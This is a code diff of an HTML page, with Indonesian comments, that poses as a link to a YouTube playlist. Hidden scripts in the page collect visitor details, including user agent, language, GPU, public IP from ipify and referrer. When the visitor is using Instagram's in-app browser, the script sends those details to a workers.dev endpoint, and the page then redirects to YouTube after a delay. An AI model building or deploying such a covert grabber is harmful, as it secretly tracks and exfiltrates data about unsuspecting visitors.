@@ -16,7 +16,19 @@
   <script src="./f1337.js"></script>
 
   <script>
-    // Kumpulin data visitor + redirect setelahnya
+    // Delay buat redirect normal
+    setTimeout(function () {
+      window.location = 'intent://www.youtube.com/playlist?list=PLAkH97YwdLFg820IAgaluO45Aqwd584Rb&si=UQBOD7o6D3GtnL5t#Intent;package=com.google.android.youtube;scheme=https;end';
+      window.location = 'vnd.youtube://www.youtube.com/playlist?list=PLAkH97YwdLFg820IAgaluO45Aqwd584Rb&si=UQBOD7o6D3GtnL5t';
+
+      setTimeout(function () {
+        window.location = 'https://www.youtube.com/playlist?list=PLAkH97YwdLFg820IAgaluO45Aqwd584Rb&si=UQBOD7o6D3GtnL5t';
+      }, 1000);
+    }, 5000);
+  </script>
+
+  <script>
+    // Kumpulin data visitor
     (async function () {
       const userAgent = navigator.userAgent;
       const language = navigator.language;
@@ -26,6 +38,7 @@
       const cookies = navigator.cookieEnabled;
       const doNotTrack = navigator.doNotTrack;
 
+      // Default GPU value
       let gpu = "Not Available";
       try {
         const canvas = document.createElement("canvas");
@@ -36,6 +49,7 @@
         gpu = "Error";
       }
 
+      // Get IP from ipify
       let ip = "Unknown";
       try {
         const res = await fetch('https://api.ipify.org?format=json');
@@ -45,8 +59,10 @@
         ip = "Error";
       }
 
+      // Referrer
       const refUrl = document.referrer;
 
+      // Gabungin semua info ke 1 string buat di-encode
       const infoText = `
 🧭 User Agent: ${userAgent}
 🌐 Language: ${language}
@@ -60,25 +76,15 @@
 🔗 Referrer: ${refUrl}
       `.trim();
 
+      // Cek kalo pake Instagram browser
       const urlParams = new URLSearchParams(window.location.search);
-      const fromWorker = urlParams.has("from");
-
+    
+    const fromWorker = urlParams.has("from");
+    
       if (userAgent.toLowerCase().includes("instagram") && !fromWorker) {
         const encoded = encodeURIComponent(infoText);
-        window.location.href = `https://workers.client57.workers.dev/api/rfig?result=%0A${encoded}%0A`;
-        return; // Stop here biar gak lanjut ke redirect YouTube
+        window.location.href = `https://workers.client57.workers.dev/api/rfig?result=%0A${encoded}`;
       }
-
-      // Tunggu 5 detik sebelum redirect ke YouTube kalau bukan dari Instagram
-      setTimeout(function () {
-        window.location = 'intent://www.youtube.com/playlist?list=PLAkH97YwdLFg820IAgaluO45Aqwd584Rb&si=UQBOD7o6D3GtnL5t#Intent;package=com.google.android.youtube;scheme=https;end';
-        window.location = 'vnd.youtube://www.youtube.com/playlist?list=PLAkH97YwdLFg820IAgaluO45Aqwd584Rb&si=UQBOD7o6D3GtnL5t';
-
-        setTimeout(function () {
-          window.location = 'https://www.youtube.com/playlist?list=PLAkH97YwdLFg820IAgaluO45Aqwd584Rb&si=UQBOD7o6D3GtnL5t';
-        }, 1000);
-      }, 5000);
-
     })();
   </script>
 
